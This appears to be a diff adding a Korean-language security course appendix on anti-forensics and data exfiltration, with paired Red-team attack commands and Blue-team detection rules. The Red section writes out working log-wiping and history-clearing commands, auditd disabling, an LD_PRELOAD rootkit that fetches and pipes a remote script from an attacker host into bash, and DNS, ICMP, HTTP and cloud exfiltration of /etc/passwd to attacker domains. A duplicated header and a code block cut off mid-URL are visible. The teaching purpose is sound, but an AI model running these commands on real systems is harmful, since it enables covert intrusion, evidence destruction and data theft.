@@ -1318,3 +1318,322 @@ graph LR
 
 **학생 액션**: lab CVE-2024 persist 시도 → 흔적.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course12 — Week 05 안티포렌식 + 데이터 유출)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | 로그 wipe | shred / `> /var/log/...` |
+| s2 | Bash history clear | `unset HISTFILE; history -c` |
+| s3 | 파일 immutable | chattr +i |
+| s4 | timestomp | touch -t |
+| s5 | DNS exfil | iodine / dnscat2 |
+| s6 | ICMP tunnel | ptunnel / icmpsh |
+| s7 | Steganography | steghide / outguess / age |
+| s8 | Cloud sync (정상 traffic) | rclone / awscli |
+
+### Red 환경
+
+```bash
+# DNS tunnel
+sudo apt install -y iodine
+git clone https://github.com/i
+
+## 부록: 학습 OSS 도구 매트릭스 (Course12 — Week 05 안티포렌식 + 데이터 유출)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | 로그 wipe | shred + log truncate |
+| s2 | Bash history clear | unset HISTFILE / history -c |
+| s3 | 파일 immutable | chattr +i |
+| s4 | timestomp | touch -t |
+| s5 | DNS exfil | iodine / dnscat2 / DNSExfiltrator |
+| s6 | ICMP tunnel | ptunnel / icmpsh |
+| s7 | Stego | steghide / outguess / age |
+| s8 | Cloud (정상 처럼) | rclone / awscli |
+
+### 학생 환경 준비
+
+```bash
+sudo apt install -y iodine ptunnel steghide outguess
+
+git clone https://github.com/iagox86/dnscat2 /tmp/dnscat2
+git clone https://github.com/Arno0x/DNSExfiltrator /tmp/dnsexfil
+
+# age (modern crypto, GPG 대안)
+curl -L https://github.com/FiloSottile/age/releases/latest/download/age-v1.1.1-linux-amd64.tar.gz | tar xz
+sudo mv age/age age/age-keygen /usr/local/bin/
+
+# rclone
+curl https://rclone.org/install.sh | sudo bash
+```
+
+### Red — 안티포렌식 7 기법
+
+```bash
+# === 1. 로그 wipe (보안 ID 제거) ===
+sudo > /var/log/auth.log
+sudo > /var/log/wtmp
+sudo > /var/log/btmp
+
+# 더 안전 (덮어쓰기 + 삭제)
+sudo shred -uvz /var/log/auth.log
+sudo shred -uvz /root/.bash_history
+
+# Journalctl 특정 사용자
+sudo journalctl --vacuum-files=0 --user=ccc
+
+# === 2. 현재 세션 history 끄기 ===
+unset HISTFILE
+export HISTSIZE=0
+history -c
+
+# 또는 공백으로 시작 (HISTCONTROL=ignorespace)
+ sudo wget http://attacker/p
+
+# === 3. 파일 immutable ===
+sudo chattr +i /tmp/payload
+ls -la /tmp/payload                                       # 'i' attribute
+sudo lsattr /tmp/payload
+
+# rm 도 안 됨 — 분석가가 풀어야 함:
+# sudo chattr -i /tmp/payload && rm /tmp/payload
+
+# === 4. Timestamp 변조 (timestomp) ===
+touch -t 202001010000 /tmp/payload
+
+stat /tmp/payload
+# Modify: 2020-01-01 (위조)
+
+# 더 정확 (atime/mtime/ctime 모두)
+touch -d "2020-01-01 12:00:00" /tmp/payload
+sudo touch -a -t 202001010000 /tmp/payload                # access only
+
+# === 5. auditd 비활성 ===
+sudo auditctl -e 0
+sudo systemctl stop auditd
+sudo systemctl disable auditd
+
+# === 6. Process 이름 위장 ===
+cp /bin/bash /tmp/.kworker
+exec -a "[kworker/u8:1]" /tmp/.kworker -i &
+# ps 에서 [kworker/u8:1] 으로 보임 — kernel worker 처럼
+
+# === 7. LD_PRELOAD rootkit ===
+cat > /tmp/evil.c << 'CEOF'
+#include <stdio.h>
+#include <stdlib.h>
+__attribute__((constructor))
+void init() {
+    if (getuid() == 0) {
+        system("nohup curl -s attacker:8080/c | bash &>/dev/null &");
+    }
+}
+CEOF
+gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c
+sudo bash -c 'echo "/tmp/evil.so" >> /etc/ld.so.preload'
+sudo chattr +i /etc/ld.so.preload                         # immutable
+```
+
+### Red — 데이터 유출 5 채널
+
+```bash
+# === 1. DNS exfil (가장 은닉 — DNS 만 외부 허용) ===
+
+# 1-1) iodine (TUN 인터페이스 — 풀 IP traffic)
+# Server (attacker, 인증 도메인 + NS 필요):
+sudo iodined -f -c -P pwd 10.0.0.1 t.attacker.com &
+
+# Client (victim):
+sudo iodine -f -P pwd t.attacker.com
+# → dns0 인터페이스 자동 생성 → 모든 traffic DNS query 로
+
+# 1-2) dnscat2 (단순 DNS C2)
+# Server:
+ruby /tmp/dnscat2/server/dnscat2.rb attacker.com
+
+# Client:
+/tmp/dnscat2/client/dnscat --secret=mysecret attacker.com
+
+# 1-3) DNSExfiltrator (파일 단일 exfil)
+python3 /tmp/dnsexfil/dnsexfiltrator.py -d attacker.com \
+    -p secret_passphrase -f /etc/passwd
+
+# 1-4) 단순 dig 으로 (느림)
+DATA=$(base64 < /etc/passwd | tr -d '\n')
+for chunk in $(echo "$DATA" | fold -w50); do
+    dig @attacker-ns "${chunk}.exfil.attacker.com" +short
+    sleep 1
+done
+
+# === 2. ICMP tunnel ===
+# Server (attacker):
+sudo ptunnel -x mysecret &
+
+# Client (victim):
+sudo ptunnel -p attacker -lp 8000 -da target.attacker.com -dp 22 -x mysecret
+# → localhost:8000 → ICMP tunnel → target.attacker.com:22
+
+# === 3. Steganography (정상 이미지에 데이터 숨김) ===
+# Cover image
+wget https://example.com/normal.jpg -O /tmp/cover.jpg
+
+# 데이터 숨김
+steghide embed -cf /tmp/cover.jpg -ef /etc/passwd -p Pa\$\$w0rd
+# /tmp/cover.jpg 가 외관상 그대로 — 데이터 내장
+
+# 나중에 추출
+steghide extract -sf /tmp/cover.jpg -p Pa\$\$w0rd
+# /etc/passwd 복원
+
+# Outguess (대안)
+outguess -k Pa\$\$w0rd -d /etc/passwd /tmp/cover.jpg /tmp/cover-stego.jpg
+
+# === 4. age (modern crypto + 작은 통신) ===
+# Key 생성
+age-keygen -o /tmp/key.txt
+PUBKEY=$(grep public /tmp/key.txt | cut -d' ' -f4)
+
+# 데이터 암호화
+age -r $PUBKEY /etc/passwd > /tmp/passwd.age
+
+# 간단 HTTP 으로 송신
+curl -X POST -F "f=@/tmp/passwd.age" http://attacker:8080/u
+
+# 또는 정상 chat 처럼:
+curl -F "image=@/tmp/passwd.age" https://imgur.com/upload
+
+# === 5. Cloud sync (정상 traffic 처럼) ===
+# rclone (50+ 클라우드 백엔드)
+rclone copy /tmp/loot.tar attacker-s3:bucket/
+
+# AWS CLI
+aws s3 cp /tmp/loot.tar s3://attacker-bucket/
+
+# Gist (GitHub)
+gh gist create /tmp/loot.tar --public=false
+
+# 정상 chat app (Slack/Discord webhook)
+curl -X POST $SLACK_WEBHOOK \
+    -F "file=@/tmp/loot.tar" \
+    -F "channels=private-channel"
+```
+
+### Blue — 안티포렌식 + 유출 탐지
+
+```bash
+# === 1. Wazuh FIM (변경 감지) ===
+sudo tee -a /var/ossec/etc/ossec.conf << 'XEOF'
+<syscheck>
+  <directories check_all="yes" realtime="yes">/var/log</directories>
+  <directories check_all="yes" realtime="yes">/etc</directories>
+  <directories check_all="yes" realtime="yes">/usr/bin</directories>
+</syscheck>
+XEOF
+
+# === 2. Falco (anti-forensic 탐지) ===
+sudo tee /etc/falco/falco_rules.local.yaml << 'YEOF'
+- rule: Log Wiped
+  desc: 로그 파일 zero-out
+  condition: >
+    open_write and 
+    fd.directory startswith "/var/log" and
+    proc.cmdline matches "(>|truncate|shred|rm)"
+  output: "Log wiped (user=%user.name file=%fd.name cmd=%proc.cmdline)"
+  priority: ERROR
+
+- rule: Auditd Disabled
+  desc: auditd 비활성 시도
+  condition: spawned_process and proc.cmdline contains "auditctl -e 0"
+  output: "Auditd disabled (user=%user.name)"
+  priority: CRITICAL
+
+- rule: chattr +i Suspicious
+  condition: spawned_process and proc.name = chattr and proc.cmdline contains "+i"
+  output: "Immutable attribute (cmd=%proc.cmdline)"
+  priority: WARNING
+
+- rule: LD_PRELOAD modified
+  condition: open_write and fd.name = "/etc/ld.so.preload"
+  output: "LD_PRELOAD modified (user=%user.name)"
+  priority: CRITICAL
+YEOF
+sudo systemctl restart falco
+
+# === 3. DNS exfil 탐지 (Suricata + Zeek) ===
+# Suricata DNS query length anomaly
+sudo tee /etc/suricata/rules/dns-exfil.rules << 'ZEOF'
+alert dns any any -> any 53 (msg:"Long DNS query (possible exfil)"; \
+    flow:to_server; \
+    dns.query; bsize:>80; \
+    sid:1000050;)
+
+alert dns any any -> any 53 (msg:"DNS query rate anomaly"; \
+    flow:to_server; \
+    threshold: type both, track by_src, count 100, seconds 60; \
+    sid:1000051;)
+ZEOF
+
+# Zeek dns.log 분석
+zeek-cut -d ts query qtype_name < /opt/zeek/logs/current/dns.log | \
+    awk '{ if(length($2) > 100) print }' | head -20
+
+# === 4. ICMP tunnel 탐지 ===
+# 비정상 ICMP payload 크기
+sudo tcpdump -i eth0 -nn 'icmp and len > 200'
+
+# === 5. Stego 탐지 (zsteg / stegseek) ===
+sudo apt install -y zsteg stegseek
+
+# 의심 이미지 자동 분석
+zsteg /tmp/suspicious.jpg
+stegseek /tmp/suspicious.jpg /usr/share/wordlists/rockyou.txt
+
+# === 6. Cloud upload 탐지 (DLP) ===
+# Suricata HTTP Content-Type filter
+sudo tee /etc/suricata/rules/cloud-upload.rules << 'WEOF'
+alert http any any -> any any (msg:"S3/cloud upload"; \
+    flow:established,to_server; \
+    http.host; pcre:"/(s3|drive|onedrive|dropbox)\..+/i"; \
+    http.method; content:"POST"; \
+    sid:1000060;)
+WEOF
+```
+
+### 통합 분석 (auto-forensic)
+
+```bash
+#!/bin/bash
+# /usr/local/bin/auto-forensic.sh
+
+# 1) 변경된 파일 (AIDE)
+sudo aide --check 2>&1 > /tmp/aide.txt
+
+# 2) 비정상 process
+osqueryi 'SELECT pid, name, cmdline FROM processes WHERE on_disk=0 OR cmdline LIKE "%kworker%";'
+
+# 3) 의심 connection
+osqueryi 'SELECT pid, local_address, remote_address, remote_port FROM process_open_sockets WHERE family = 2;'
+
+# 4) Cron 변경
+osqueryi 'SELECT * FROM crontab;'
+
+# 5) Persistence
+osqueryi 'SELECT * FROM systemd_units WHERE active_state = "active";'
+
+# 6) LD_PRELOAD 점검
+cat /etc/ld.so.preload 2>/dev/null
+sudo lsattr /etc/ld.so.preload                            # immutable?
+
+# 7) Log 변경
+ls -la --time=ctime /var/log/auth.log /var/log/syslog
+# 정상: 점진적 변경 / 의심: ctime 비정상 (날짜)
+```
+
+학생은 본 5주차에서 **Red (shred + chattr + iodine + dnscat2 + ptunnel + steghide + age + rclone) ↔ Blue (Wazuh FIM + Falco + Suricata + Zeek + AIDE + osquery)** 의 안티포렌식 + 유출 공방을 OSS 도구로 익힌다.
